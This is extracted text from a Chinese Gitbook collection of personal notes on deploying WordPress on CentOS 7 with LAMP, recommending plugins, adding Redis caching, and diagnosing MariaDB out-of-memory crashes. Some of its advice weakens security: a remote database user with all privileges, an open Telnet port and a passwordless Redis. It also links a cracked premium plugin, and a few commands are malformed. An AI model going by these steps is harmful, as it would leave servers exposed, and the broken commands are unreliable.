连接MariaDB数据库，输入刚才设置的密码： mysql -u root -p 创建wordpress数据库（后面部署WordPress要用到，记住数据库名wordpress）： create database wordpress; 建议创建一个WordPress专用的数据库用户wpUser ，而不要用root用户： create user wpUser identified by 'wpPasswd'; 授予其wordpress数据库所有权限并可用于远程登陆（但平时不要开放远程登陆端口，可通过防火墙或云服务的安全组策略对3306端口进行拦截）： grant all privileges on wordpress. to 'wpUser'@'%' identified by 'wpPasswd' with grant option; 刷新权限表使前面设置生效： flush privileges; 断开数据库连接： exit; 至此MariaDB安装完成。 3.4. 安装PHP 5.6.36 由于PHP官网的源可能比较旧（默认是5.4），这里换一个安装源： rpm -Uvh https://mirror.webtatic.com/yum/el7/webtatic-release.rpm 若报错：epel-release >= 7 is needed by webtatic-release-7-3.noarch , 先安装这个工具（安装完后重新跑前一个命令）： yum -y install epel-release 然后看一下有没有我们要装的PHP版本（所列印表单的第二列就是版本号，若看到PHP 5.6相关组件都是大于5.6.33 版本的，则可以安装）： yum list php* 安装PHP 5.6的组件（这些模块就是从列表中选的，注意不用加后缀）： yum install php56w php56w-mysql php56w-gd libjpeg* php56w-ldap php56w-odbc php56w-pear php56w-xml php56w-xmlrpc php56w-mbstring php56w-bcmath PHP 5.6还要额外安装一个加密组件： yum groupinstall \"development tools\" yum -y install mhash mhash-devel mcrypt 另外PHP的配置文件在这里（暂时不需要动）： /etc/php.ini 查看PHP版本号： php -v 至此PHP安装完成。 3.5. 安装phpMyAdmin 这个工具是通过web界面管理数据库的（Web版本的数据库客户端工具），依赖于PHP，所以版本要与PHP配套。Centos7自带的phpmyadmin可用于PHP5.x，直接安装就可以了： yum -y install phpmyadmin 安装完后重启下Apache服务： systemctl restart httpd.service 测试phpMyAdmin是否安装成功，浏览器打开网址： http://127.0.0.1/phpMyAdmin/index.php 注意，若打不开，检查下： ① 防火墙要开放80、3306端口入网规则 ② 若是云服务器IP要改成公网地址 ③ 若是云服务器要配置安全组策略开放80、3306端口 ④ 若部署在云服务器，不建议放权打开这个地址 使用vi命令修改phpMyAdmin的配置文件用于连接数据库： vi /etc/phpMyAdmin config.inc.php 由于使用MariaDB / Mysql数据库，很多选项保持默认值即可，只要把刚才设置的数据库帐密设置进去即可： $cfg['Servers'][$i]['user'] = 'wpUser'; cfg['Servers'][$i]['password'] = 'wpPasswd'; 最后重启下Apache服务： systemctl restart httpd.service 至此phpMyAdmin安装完成，LAMP环境安装完成。 3.6. 安装WordPress 4.9.4中文版 由于Centos7的官方源都是英文版，可以去WordPress的官网下载中文版： https://cn.wordpress.org/txt-download/ 下载回来后，上传并解压到Apache的html项目目录下： /var/www/html 上传可使用FTP（后面再说安装步骤），也可使用rz工具（推荐，更方便），rz安装命令如下： yum install lrzsz 上传wordpress压缩包： rz 上传后，这里有两种处理方式： ① 直接解压 wordpress根目录到/var/www/html目录下，以后用于访问wordpress站点的URL为：http://127.0.0.1/wordpress ② 不要wordpress根目录，只把里面的内容解压到/var/www/html目录下，以后用于访问wordpress站点的URL为：http://127.0.0.1 本文选择的是第 ② 种，因为我只需要部署wordpress一个web项目，而且注册了域名。如果所有URL地址都加了wordpress目录，别人访问麻烦而且丑。 解压wordpress，并删除wordpress根目录： unzip wordpress.zip mv -r ./wordpress/* . rm -rf wordpress/ 如下图所示，此时我的wordpress部署位置是这样的（直接在/var/www/html目录下，且没有wordpress目录）： 通过确认Apache配置文件/etc/httpd/conf/httpd.conf，可以发现这两个配置项： user apache group apache 说明WordPress以后会以apache用户在/var/www目录下进行读写操作，因此为了避免因为权限问题导致读写失败，需修改目录权限。 设置http根目录/var/www的所有组为apache： chown -R :apache /var/www 设置http根目录/var/www的所有者为apache： chown -R apache /var/www 设置http根目录/var/www的所有组下所有用户具有读写权限： chmod -R 775 /var/www 3.7. 安装FTP 一般情况下，到这里为止WordPress就不会因为权限问题、因为无法读写/var/www目录，导致无法升级安装主题、插件。 但如果WordPress还是提示需要FTP进行安装升级，可以继续加一个FTP用户。 安装FTP服务： yum install -y vsftpd 启动FTP： systemctl start vsftpd.service 使得FTP开机启动： systemctl enable vsftpd.service 为了安全起见，取消FTP匿名登录： vi /etc/vsftpd/vsftpd.conf 把第一行的 anonymous_enable=YES ，修改为NO 如果这里图方便，可以为root用户开放FTP权限，编辑这两个文件，用#注释root即可（但是如果是在云服务器，不建议这么做）： vi /etc/vsftpd ftpusers vi /etc/vsftpd user_list 添加一个Apache专用的FTP用户apacheftp： adduser -d /var/www -g apache -s /sbin/nologin apacheftp 命令解析：使用命令(adduser)添加apacheftp用户，不能登录系统(-s /sbin/nologin)，用户文件夹在(-d /var/www)，属于组apache(-g apache) 若出现这个提示，不用管： adduser: warning: the home directory already exists. ot copying any file from skel directory into it. 设置apacheftp用户密码： passwd apacheftp 添加用户apacheftp到ftp用户组， 这样apacheftp就同时属于ftp和apache两个组： usermod -a -G ftp apacheftp 重启FTP服务： systemctl restart vsftpd.service 最后打开浏览器：http://127.0.0.1 ，就可以开始配置Wordpress了。 初始安装会在页面要求设置数据库的库名、帐密，设置为前文设置的值即可。 若以后需要更改数据库配置，可在 /var/www/html/wp-config.php　中进行修改。 至此WordPress安装完成。 3.8. 可选：安装防火墙firewalld 服务器上为了安全起见，建议打开防火墙，Centos默认已安装好firewalld，但处于关闭状态。 查看防火墙状态： firewall-cmd --state 开启防火墙： systemctl start firewalld 永久放开HTTP 80端口、FTP服务（含20/21端口）、远程登录 22端口、Telnet 23端口： firewall-cmd --add-port=80/tcp --permanent firewall-cmd --add-service=ftp --permanent firewall-cmd --add-port=22/tcp --permanent firewall-cmd --add-port=23/tcp --permanent 重载防火墙规则： firewall-cmd --reload 查看当前的防火墙规则： iptables -L -n 设置防火墙为开机启动： systemctl enable firewalld 至此LAMP + WordPress的基本环境全部部署完成。 4. 后话：几个重要的配置文件 ① Apache-httpd服务的配置文件，主要用于配置Apache的rewrite模块功能： /etc/httpd/conf/httpd.conf ② PHP的配置文件（若在win环境用于打开关闭php的扩展模块； 若在linux环境没什么用，要用哪些模块需要直接安装即可）： /etc/php.ini ③ phpMyAdmin配置文件，其利用PHP在网页连接数据库，若数据库配置变更需要修改此配置文件： /etc/phpMyAdmin/config.inc.php ④ Wordpress配置文件，若数据库配置变更需要修改此配置文件，另外wordpress的某些自定义配置也需要用到此配置文件： /var/www/html/wp-config.php ⑤ Mariadb配置文件，后续需要优化数据库时要修改这些配置文件： /etc/my.cnf　　# 这个配置文件引用了/etc/my.cnf.d目录下的配置文件，不建议改动，避免Mariadb升级时覆盖掉 /etc/my.cnf.d/server.cnf　　# 一般情况下修改这个配置文件即可 /etc/my.cnf.d/client.cnf /etc/my.cnf.d/mysql-clients.cnf 5. 资源下载 本文全文下载 Copyright © EXP 2020 all right reserved，powered by Gitbook最后修改时间 ： 2020-08-16 01:51:12 "},"markdown/notes/website/WordPress插件推荐.html":{"url":"markdown/notes/website/WordPress插件推荐.html","title":"WordPress 插件推荐","keywords":"","body":"WordPress 插件推荐声明Jetpack （WP怪兽级插件）Yoast-Complete-SEO （搜索引擎优化工具）WP Editor.md （WP专用的Markdown）Crayon Syntax Highlighter （Crayon语法显示）WP Statistics （WP统计器）WP-PostViews （文章阅读次数统计器）WP-PostRatings （文章评分器）Enhanced Text Widget （文本小工具强化插件）Pinyin Permalinks （拼音链接）WP Real Media Library （媒体库管理器）WPide （WP在线代码编辑器）Batch Cat （文章分类批量修改器）WP Clean Up Optimizer （数据库清理优化器）WP Database Backup （WP数据库备份）Limit Login Attempts Reloaded （限制登录重试插件）Stealth Login Page （隐形登陆插件）WP Ban （访问限制插件）Akismet Anti-Spam （防垃圾评论插件）WP Super Cache （静态页面缓存）Redis Object Cache （Redis动态对象缓存）Baidu Sitemap Generator （百度站点地图生成器）Baidu Links Submit （百度链接提交插件）WP Content Copy Protection & No Right Click （文章保护插件）Auto Add Copyright （自动追加站点版权插件）Insert Post Ads （文章内页广告插件）WordPress 插件推荐 声明 本文所介绍的插件，都是本站用过、在用、或者改善过的，并非简单搬运。 因为好用，所以推荐给大家，请放心食用。 Jetpack （WP怪兽级插件） 国外最推荐的插件没有之一，国内最不推荐的插件没有之一。 JetPack插件是WordPress社区官方出品的怪兽级插件，这个插件里面集成了30个左右的网站常用的辅助功能，比如网站统计，社交分享，安全管理，邮件发送，自定义评论，拼写检查，CDN加速，移动版主题支持等等。 可以理解为：JetPack插件等于30个左右独立的插件，这30个左右的功能，都有独立的开关控制。不过，如果WordPress站点服务器在国内，别用JetPack插件，想都不要想。 这是因为JetPack插件的许多功能，都需要链接wordpress.com这个网站的服务器，而wordpress.com在墙外已经很多年了。 JetPack插件可以说是云插件，许多功能要链接到云端服务器才能完成。站点服务器在国外的话，连接wordpress.com就应该没有问题的，这时可以使用JetPack插件。但是如果站点服务器是面向国内的，JetPack插件就无法使用了，而且可能会因为访问wordpress.com超时而拖垮整个站点的访问效率。 Yoast-Complete-SEO （搜索引擎优化工具） 很强悍的SEO优化插件，在国外非常流行，据说超过25%的站点都在使用它提高搜索排名。但是在国内还是要慎用，此插件有部分功能可能要访问国外IP，启用后明显感觉到网站打开速度变慢。 Yoast-Complete-SEO-Premium-Pack-7.4.2 英文破解版下载 此插件包解压即用，所有功能都被破解，但不能登录不能升级，不然就无法再用了。其内集合了5个插件，一般网站主要安装前2个即可： ① wpseo-local：基础包 ② wordpress-seo-premium：专业包 ③ wpseo-news：非新闻站点可不安装 ④ wpseo-video：非视频站点可不安装 ⑤ wpseo-woocommerce：非社交站点可不安装 优化项目包括但不限于： ① 标题&元标记： 可以进行首页、分类、文章、页面的标题、描述、关键字的设置 ② 社会化： 只有Facebook，所以国人可以忽视这个 ③ XML站点地图： 开启XML站点地图功能，可以不用 Google XML Sitemaps 插件了 ④ 固定链接： 去除分类目录URL中的默认结构（通常是/category/），可以删除 WP No Category Base 插件了；重定向附件URL到其附加的文章页面 ⑤ 内部链接： 就是面包屑导航 ⑥ RSS： 可自动在你的RSS中添加内容。更确切地说，这意味着可以给你的网站和文章添加反向链接。当采集器也这么做，就帮助搜索引擎识别你是原创作者。 ⑦ WordPress SEO by Yoast 一个比较值得称赞的是文章发布时，有一个SEO检测功能，能够对当前文章进行检测并给出改善的建议 WP Editor.md （WP专用的Markdown） 写博客必备，在WordPress平台中最好的Markdown插件，没有之一。 特色： ① 支持基本的Markdown语法 ② 支持KaTex/Latex数学公式语法（Latex语法文档下载） ③ 支持即时截图并黏贴插入 ④ 支持生成toc目录 （需安装配套插件 Table of Contents Plus） ⑤ 支持在评论使用Markdown（需安装配套插件 WP Product Review Lite） ⑥ 支持实时预览 ⑦ 支持文章分页 ⑧ 支持代码语法高亮（这个功能不好看，下面用CSH插件补足） 注意： WP Editor.md 的 KaTex/Latex 功能需要使用CDN加速，不同地域需要设置不同的CDN服务器。 当发现 KaTex/Latex 公式无法显示时，打开F12控制台日志看见如下图的404异常，则说明是CDN服务器异常。 此时通过 WP Editor.md -> 常规设置 修改CDN路线，直到 KaTex/Latex 公式可以生效即可。 Crayon Syntax Highlighter （Crayon语法显示） 程序员必备，在WordPress平台中最好的语法高亮插件，没有之一。 特色： ① 内置多种代码的语法高亮风格 ② 支持行号显示 ③ 支持源码查看 ④ 支持双击复制 注意：这个插件的默认配置与 WP Editor.md 有冲突，在显示代码时会把代码中的html变成转义字符。 造成此问题的原因是：在后台编辑框中提交的文本被保存到数据库中，在前台展示时才会经过Markdown转码。但是做的是先由Markdown根据语法转码后交由Crayon Syntax Highlighter进行代码高亮的渲染。而Markdown会将代码中的特殊符号经由HTML进行转义，而Crayon Syntax Highlighter会原封不动地显示标签中的代码，于是转义过后的代码就被原封不动地展示出来了。 为了解决此问题，Crayon Syntax Highlighter必须在渲染时将转义过后的代码再转义回来，设置选项如下（修改配置后，受影响的文章可能需要重新提交才能生效）： 如下图勾选这两个选项： 如下图取消这两个选项： WP Statistics （WP统计器） 在WordPress平台中最强大的统计插件，没有之一。 支持统计内容： ◇ 在线用户 ◇ 今天的访问 ◇ 今天的访问 ◇ 昨日访问 ◇ 昨日访客 ◇ 过去一周的访问量 ◇ 过去一个月的访问量 ◇ 过去一年的访问量 ◇ 累计访问 ◇ 累计访客 ◇ 页面访问总数 ◇ 搜索引擎引用次数 ◇ 总计文章 ◇ 总计页面 ◇ 总计回响 ◇ 总计垃圾 ◇ 总计用户 ◇ 平均文章 ◇ 平均评论 ◇ 平均用户 ◇ 最后发表日期 WP-PostViews （文章阅读次数统计器） 当你所使用的站点主题不能对每篇文章的阅读数进行单独统计时，此插件可以补全此功能。 此插件要求站长具备一定的编程能力，因为它不能仅仅单纯在前端配置就生效，而是需要同时修改主题的php文件代码，在希望它出现的地方嵌入代码。 WP-PostRatings （文章评分器） 当你所使用的站点主题不能对每篇文章的进行单独打分时，此插件可以补全此功能。 Enhanced Text Widget （文本小工具强化插件） 此插件功能与WordPress自带的小工具【自定义HTML】类似。 不过此插件支持PHP代码，在编写小工具的时候更灵活。 Pinyin Permalinks （拼音链接） WordPress在新建页面/文章的时候，默认会使用标题作为固有链接，但是如果标题含中文或其他特殊字符，会引起页面无法访问的问题。 此插件会自动把非英文字符自动转换（可配置只转换成首字母而非全拼） 不过个人更倾向使用原生的自定义固有链接，使用文章ID更好看： WP Real Media Library （媒体库管理器） 此插件可以对上传的附件进行自定义分类，而不必都放到一个文件夹内。 WPide （WP在线代码编辑器） 此插件可在HTTP前端的WordPress后台直接编辑主题、插件代码。 若你租用的只是建站主机而非云服务器，无法登陆操作系统后台，那么这款插件就很适用了（即使可以登陆操作系统后台，这款插件也可以很方便地在页面修改主题、插件代码）。 特色： ① 支持代码高亮 ② 支持行号显示 ③ 支持语法校验 ④ 支持层级目录架构管理 Batch Cat （文章分类批量修改器） 强迫者的福音，当你网站的文章非常多，需要重新整理分类的时候，就用得着了。平时不用的时候可以不启用此插件。 这个插件是直接修改数据库的，比WordPress自带的批量更新文章要强大。而且WordPress原生的批量更新有个BUG，只能加批量分类，无法批量删分类。 特色： ① 支持批量添加文章分类 ② 支持批量修改文章分类 ③ 支持批量删除文章分类 WP Clean Up Optimizer （数据库清理优化器） 由于WordPress每次更新文章，都会复制一个文章副本版本，严重浪费数据库资源。 此插件可在HTTP前端的WordPress后台优化、清理数据库垃圾。 若你租用的只是建站主机而非云服务器，无法登陆操作系统后台数据库，那么这款插件就很适用了（即使可以登陆操作系统后台数据库，这款插件也可以避免在数据库的误操作）。 特色： ① 支持手动清理数据库垃圾 ② 支持计划/定时清理数据库垃圾 ③ 支持数据库优化 ④ 可避免误删数据库数据 注： 这个插件有一个严重的BUG，它会自动记录所有最近尝试登陆的行为到wp_clean_up_optimizer_meta 表 而每次打开WP前台/后台时，它都会第一时间去查这张表 而这张表随着时间推移会越来越大，直接导致的问题就是打开WP站点时 TTFB 越来越长（即页面很久才显示） 实测当这张表有4000条数据时，页面打开时间已经高达6秒以上 因此建议平时将此插件停用，仅才清理时才启用 WP Database Backup （WP数据库备份） 用于自动备份WP数据库的插件，方便易用。 特色： ① 支持周期备份 ② 支持控制备份数量 ③ 支持在线恢复备份 ④ 支持备份下载 ⑤ 支持备份通知 Limit Login Attempts Reloaded （限制登录重试插件） 当WordPress站点上线一段时间后，你会发现开始有那么一堆（对的不是几个是一堆）机器人在试图通过admin、administrator、或者你的域名去登录你的WordPress后台： 先不论你的站点密码有多强悍，单是这种无耻的暴力破解密码行为就会给站点服务器带来额外负担。 这个时候这个插件就很有用了，它可以设定允许重试多少次登陆密码，超过次数就对IP进行冻结，甚至永久封印： Stealth Login Page （隐形登陆插件） 为登陆页面增加验证码，当验证码输入错误时，跳转到指定页面。 配合前一个插件 Limit Login Attempts Reloaded 一起使用可有效防止机器人暴力破解站点密码： WP Ban （访问限制插件） 可以很方便地为你的站点设置一个黑名单列表，禁止机器人、非法用户的访问。 特色： ① 支持IP封禁 ② 支持IP段封禁 ③ 支持IP范围封禁 ④ 支持主机封禁 ⑤ 支持域名封禁 ⑥ 支持User Agent封禁（防爬虫） Akismet Anti-Spam （防垃圾评论插件） WordPress自带的评论过滤插件，可以防止机器人灌水、放外链，非常强大。 个人用户是可以免费使用的，在官方页面获取时拖动价格条到最左边即可，如下图： WP Super Cache （静态页面缓存） 此插件的作用是生成静态页面缓存，可加速站点访问。 对于一般的站点来说（例如WordPress博客），如果不是刚需，这个插件用于缓存加速是够用的，方便且暴力。 Redis Object Cache （Redis动态对象缓存） 此插件的作用是生成动态对象缓存，可加速站点访问。 相比静态缓存的部署要复杂，主要适用于那些经常需要动用数据库查询的站点（例如WordPress论坛）。具体部署方法可参看《加速访问WordPress：Redis部署笔记》。 Baidu Sitemap Generator （百度站点地图生成器） 每个站点都必备一个站点地图Sitemap，有站点地图会更容易被搜索引擎收录站点内容（当然robots.txt协议文件也很重要）。 可以生成站点地图的插件很多，但是如果是中文站点，推荐还是使用百度，毕竟百度是全球最大的中文搜索引擎，使用此插件更易于被百度蜘蛛收录。 特色： ① 支持生成xml格式站点地图 ② 支持生成html格式站点地图 ③ 随着站点更新，可以同步生成站点地图 Baidu Links Submit （百度链接提交插件） 相对站点地图Sitemap的被动收录而言，此插件可以主动向百度实时提交网站的新链接，使其被百度搜索引擎及时收录，需注册 百度站长平台 配合使用。 插件最初来源于 百度站长论坛，但是因为原版主在2015年已停更，后来百度站长平台又升级了、加之插件本身也有几个BUG，最后导致无法使用了。 鉴于我比较喜欢这个插件的风格，因此我把2015版本的BUG修正后，重新发布了这个2018修正版： Baidu Links Submit v2.0（20180704）下载 该插件的原理其实就是封装了 “百度站长平台->链接提交->自动提交->主动推送（实时）” 的功能。因此使用了此插件后，原本用于主动实时提交到百度的其他类似功能的插件或JS代码就要删掉了，避免二次提交导致百度翻脸。 使用方法请参看《WP插件：Baidu Links Submit - 实时推送站点链接到百度》 WP Content Copy Protection & No Right Click （文章保护插件） 如果你的站点不希望被别人随意复制内容，那么这个插件就很有用了。不过这个插件会对读者很不友好，需要慎用。 特色： ① JavaScript保护 ② CSS保护 ③ 主页保护 ④ 静态页面保护 ⑤ 禁止右键功能（避免右键复制） ⑥ 禁止内容选择（避免快捷键复制） ⑦ 自定义禁止提示语 Auto Add Copyright （自动追加站点版权插件） 这是本站出品的一个插件，相比于前一个插件（WP Content Copy Protection & No Right Click），这个插件的做法则温和得多，对读者也更友好。 特色： ① 当读者试图复制站点内容时，会自动在复制内容末尾追加站点版权信息 ② 可设置允许读者复制的内容长度，小于这个长度不会触发追加机制 ③ 可设置本插件的生效范围：全站、或仅文章页面 ④ 支持大部分主流浏览器 ⑤ 复制内容支持纯文本、代码等，不会造成复制内容格式变形 此插件的详细介绍可见《WP插件：Auto Add Copyright – 被复制时自动追加版权链接》。 Auto Add Copyright v1.0（20180707）下载 Insert Post Ads （文章内页广告插件） 可以自由定制在文章首部、尾部、中间某个段落后插入一个或多个广告，解决了在编写文章时去才能在文章中间插入广告的问题。 Copyright © EXP 2020 all right reserved，powered by Gitbook最后修改时间 ： 2020-08-16 01:51:12 "},"markdown/notes/website/加速访问WordPress.html":{"url":"markdown/notes/website/加速访问WordPress.html","title":"加速访问 WordPress","keywords":"","body":"加速访问WordPress：Redis部署笔记1. 前言2. Redis 部署环境声明3. Redis 数据库服务端安装4. Redis配置4.1. 设置Redis为后台进程启动模式4.2. 设置Redis开机自启动5. Redis Object Cache 插件安装6. 站点使用Redis后的变化附：Redis的密码问题资源下载加速访问WordPress：Redis部署笔记 1. 前言 通过缓存加速 WordPress 站点访问的方法有很多，从软件层面来说，主要有两种方式： 生成静态页面缓存（如通过 WP Super Cache 插件实现） 动态对象缓存（如通过 Redis Object Cache 插件实现，详见本文） 对于一般的站点来说（例如WordPress博客，但需保证其大部分页面都没有随机化查询），如果不是刚需，使用WP Super Cache插件进行静态页面缓存加速是够用的，方便且暴力。 当然也可使用Redis Object Cache（基于Redis的动态对象缓存），但这更适用于那些经常需要动用数据库查询的站点（例如WordPress论坛）。 那么究竟什么时候用静态缓存，什么时候用动态缓存？可以参考下面两个例子： ① 假设一个日IP大于2万的WordPress站点，虽然这个站的流量很高，但是站点本身不需要开放用户注册的功能，那么站长最好的加速方案就是用各种类似WP Super Cache的插件生成静态页面。因为这类站点本身就不大需要动用数据库查询，所以自然也就不太需要Redis做对象缓存。 ② 假设还是一个日IP大于2万的WordPress站点，但是这个站点必须要开放用户注册，并且用户注册的数量也相当之多，每天登录的用户也相当之多，那么这个时候一个生成静态页面的缓存插件可能就达不到理想的效果了。因为用户登录的这种行为，插件是无法静态化的，那么这种本身就需要经常动用数据库查询的操作，该如何提高效率呢？这个时候就需要用到Redis的对象缓存了。从本质上看，对象缓存就是缓存那些经常需要在数据库中查询的数据，当这种数据再次需要查询的时候，就可以通过Redis直接从内存中读取，而不需要再到MySQL中反复查询。这样就达到了一个加速、优化的效果。 下面则针对 WordPress + Redis 的部署方式进行详细说明。 2. Redis 部署环境声明 本文是基于Centos7系统中LAMP环境下的WordPress站点（详见《LAMP环境 + WordPress 部署笔记》），进行Redis缓存加速服务的部署。 3. Redis 数据库服务端安装 到官网下载最新版，本文下载的版本是 redis-4.0.10.tar.gz： 中文官网：http://www.redis.cn/ 英文官网（需翻墙）：https://redis.io/ 上传到WordPress所在的服务器，本文上传位置为（注意这个位置就是最终的安装目录）： /usr/local/redis-4.0.10.tar.gz 解压安装包： tar -zxvf redis-4.0.10.tar.gz 由于Redis需要编译安装，先安装gcc编译环境： yum install gcc 进入Redis安装目录： cd /usr/local/redis-4.0.10/ 编译： make MALLOC=libc 编译完成后，进入src目录： cd /usr/local/redis-4.0.10/src/ 把 src 目录下的文件安装到 /usr/local/bin ： make install 至此Redis数据库服务端安装完成。 4. Redis配置 默认情况下，Redis是通过这种方式启动的，非但无法在后台运行，而且也不符合使用习惯： cd /usr/local/redis-4.0.10/src/ # 切换到启动脚本目录 ./redis-server ../redis.conf # 启动Redis Ctrl + C # 停止Redis 另外Redis也不直接支持开机自启，为此要对其进行改造。 4.1. 设置Redis为后台进程启动模式 通过vi修改redis.conf文件： vi /usr/local/redis-4.0.10/redis.conf 修改为支持后台启动，找到关键字 daemonize no，修改为： daemonize yes 这里 顺便修改 最大内存为512M（根据实际情况配置，建议为当前空闲内存的50%左右），找到关键字maxmemory，修改为（注意单位是byte）： maxmemory 536870912 4.2. 设置Redis开机自启动 在/etc目录下新建redis目录： mkdir /etc/redis 拷贝redis.conf配置文件到/etc/redis目录下，并重命名为6379.conf（取的是Redis默认端口名称，Redis启动脚本里的变量会读取这个名称，因此若redis的端口号改了，这个文件名也要修改）： cp /usr/local/redis-4.0.10/redis.conf /etc/redis/6379.conf 拷贝Redis的启动脚本到/etc/init.d目录下，并重命名为redisd： cp /usr/local/redis-4.0.10/utils/redis_init_script /etc/init.d/redisd 通过vi修改redisd文件： vi /etc/init.d/redisd 在首行 #!/bin/sh 下面添加两行（其含义是Redis服务必须在运行级2，3，4，5下被启动或关闭，启动的优先级是90，关闭的优先级是10）： #!/bin/sh # chkconfig: 2345 90 10 # description: Redis is a persistent key-value database 切换到/etc/init.d目录： cd /etc/init.d 设置为开机自启： chkconfig redisd on # 关闭开机自启 # chkconfig redisd off # 显示所有运行级系统服务的运行状态信息 # chkconfig --list 现在可以直接以服务的形式启动和停止Redis了： 启动：service redisd start 停止：service redisd stop 5. Redis Object Cache 插件安装 直接在WordPress插件中心搜索安装即可，不需要也无法改动Redis配置。只要Redis服务没有修改过端口和密码，就可以使用默认值。 理论上通过修改WordPress的设置文件wp-config.php，可以添加并修改Redis Object Cache的配置，但实测无效（即使重启过服务器也不生效）： define('WP_REDIS_CLIENT', 'pecl'); // 指定用于与Redis通信的客户端, pecl 即 The PHP Extension Community Library define('WP_REDIS_SCHEME', 'tcp'); // 指定用于与Redis实例进行通信的协议 define('WP_REDIS_HOST', '127.0.0.1'); // Redis服务器的IP或主机名 define('WP_REDIS_PORT', '6379'); // Redis端口 define('WP_REDIS_DATABASE', '0'); // 接受用于使用该SELECT命令自动选择逻辑数据库的数值 define('P_REDIS_PASSWORD', ''); // Redis密码 define('WP_CACHE_KEY_SALT', 'wp_'); // 设置所有缓存键的前缀（Wordpress多站点模式下使用） define('WP_REDIS_MAXTTL', '86400'); 6. 站点使用Redis后的变化 页面访问几乎秒开（部署Redis前后加速非常明显） 后台编辑文章时保存变慢（可能需要做缓存同步） 附：Redis的密码问题 默认情况下，Redis是不需要密码登陆的，而且若是用于WordPress的Redis Object Cache插件加速，也不建议配置Redis密码，因为不知道是不是当前Redis Object Cache插件版本的BUG，无法为其配置Redis密码，只能使用Redis的默认配置（无密码）进行数据库连接。 若非要设置Redis密码，可修改redis.conf文件，找到关键字requirepass，修改为： requirepass 密码 资源下载 本文全文下载 Copyright © EXP 2020 all right reserved，powered by Gitbook最后修改时间 ： 2020-08-16 01:51:12 "},"markdown/notes/website/Mariadb周期性崩溃处理记录.html":{"url":"markdown/notes/website/Mariadb周期性崩溃处理记录.html","title":"Mariadb 周期性崩溃处理记录","keywords":"","body":"Mariadb周期性崩溃问题处理：Error establishing a database connection问题描述问题分析原因定位问题处理创建交换分区swap附1：减少InnoDB的需求缓存附2：利用crontab守护Mariadb资源下载Mariadb周期性崩溃问题处理：Error establishing a database connection 问题描述 建站环境：Centos7 + LAMP + WordPress 物理内存：2G 相关插件：Redis Object Cache （Redis缓存加速） 数据库：Mariadb + Redis （均使用默认数据库配置） 异常现象：几乎很规律地每周一次打开站点时提示Error establishing a database connection 临时恢复手段：重启 Marridb 进程 问题分析 刚开始以为是偶发的，就没在意，但是数个月来都是每周一次，就实在是折腾人了。 最初分析以为是 Redis Object Cache 插件导致的（怀疑是Redis缓存数据过期引起的雪崩），但是关掉Redis Object Cache 之后依旧是每周一次，那就肯定是Mariadb自身的问题了。 而且这个问题有几个很有意思的关键点： 很有规律地每周一次（当然是基于我的环境而言，不同的环境触发时机可能不同） Mariadb数据库未做过任何配置优化（纯粹使用默认配置） 每次都可以通过重启Mariadb进程恢复 不难联想到是内存导致的（事后也证实了是这个原因），而重启Mariadb进程可以解决是因为做了内存的释放与再分配。 原因定位 首先去核查Mariadb数据库的异常日志，确认数据库崩溃的时候都发生了些什么。 如果不知道异常日志的位置，可以通过输入以下命令，利用Mariadb的进程信息找到它： ps -ef|grep mariadb 若Mariadb正在运行，会返回类似于以下的信息： mysql 31877 31532 0 16:07 ? 00:00:04 /usr/libexec/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib64/mysql/plugin --log-error=/var/log/mariadb/mariadb.log --pid-file=/var/run/mariadb/mariadb.pid --socket=/var/lib/mysql/mysql.sock --port=3306 其中log-error就是异常日志的位置，这里为： /var/log/mariadb/mariadb.log 通过tail /var/log/mariadb/mariadb.log命令可查看最近发生的异常。 具体的日志我就不全部贴出来了，这里只拷贝日志中一些与当下要解决的问题相关的部分： # Mariadb崩溃前打印的异常 180906 0:51:40 InnoDB: Fatal error: cannot allocate memory for the buffer pool 180807 19:30:09 [ERROR] mysqld: Out of memory (Needed 128917504 bytes) 180908 13:56:25 InnoDB: The InnoDB memory heap is disabled # Mariadb重启后打印的信息 180910 8:04:41 InnoDB: Initializing buffer pool, size = 128.0M 180910 8:04:41 InnoDB: Completed initialization of buffer pool 前三行就是导致Error establishing a database connection异常的罪魁祸首，在一次数据库崩溃的时候不一定都会出现，但他们所描述的大概意思都是差不多的：由于机器内存不足，无法分配给InnoDB缓冲池足够的内存，导致InnoDB无法启用。 后两行是Mariadb重启后打印的，意思是：成功分配给InnoDB缓冲池128M内存（具体分配多少内存是视Mariadb的实际配置而定的）。 需知道Mariadb本质上就是Mysql的分支，因此也具备了InnoDB和MyISAM两种存储引擎。而InnoDB的缓存机制与MyISAM的最大区别就在于，InnoDB不仅仅缓存索引，还会缓存实际的数据。所以使用InnoDB的前提是要有足够大的物理内存。 [info] 在Mariadb的服务配置文件中有一个innodb_buffer_pool_size 参数，它用来设置InnoDB缓存用户表及索引数据的最主要缓存空间，对InnoDB整体性能影响也最大。 其实前面说了这么多，总结下来就是： Mariadb没有配置好InnoDB，WordPress本身就比较占资源，站点访问量稍微大一些，之前已分配给InnoDB的内存就满了。机器内存由于还提供了其他应用服务，剩余内存不够InnoDB重分配，而机器本身又没有针对垃圾内存的释放策略，于是Mariadb进程就锁死了。最终WordPress由于无法连接到数据库，在站点页面打印了异常Error establishing a database connection。 问题处理 其实这个问题多发于内存低配的服务器上，内存高配服务器并不明显。 但无论低配还是高配服务器，都需要具备一套针对内存不足时的处理策略。现在既然知道到了问题的根本原因，就能定制出对应的处理方案： 减少InnoDB需求的内存：这是直观上处理手段，但是指标不治本，只是问题的触发周期延长了而已。 优化服务器的内存处理策略：推荐建立合理的交换分区swap（类似于虚拟内存技术），可从根本上解决问题。 建立Mariadb进程的守护进程：这是备用的补救措施，如可通过crontab命令检测Mariadb进程状态，发生异常时即时重启。 创建交换分区swap swap（即交换分区）是在Linux上较为推崇的、类似于Windows的虚拟内存技术。具备swap的Linux，当遇到物理内存不足的情况，就可以把部分硬盘空间当成虚拟内存使用，从而解决了物理内存不足的问题。 Linux把物理内存划分为多个内存段，称为页面。而交换就是指内存页面被复制到预先设定好的硬盘空间（即交换空间）的过程，目的是释放掉页面的内存，供其他应用使用。物理内存和交换空间的总大小是可用的虚拟内存的总量。 下面描述如何在Centos上创建交换分区。 首先需要使用root用户登陆系统。 通过free -mh命令查看内存和swap的分配情况，默认Centos是没有设置swap的，因此swap分区的大小是0： 　　　　total　　used　　　free　　shared　buff/cache　available Mem: 　　　1.8G　　662M　　210M　　560K　　　965M　　　1.0G Swap:　　　　0　　　　0　　　　0 [info] 也可以通过swapon -s命令查看已经配置的swap空间（但若无配置swap空间则此命令无任何反应）。 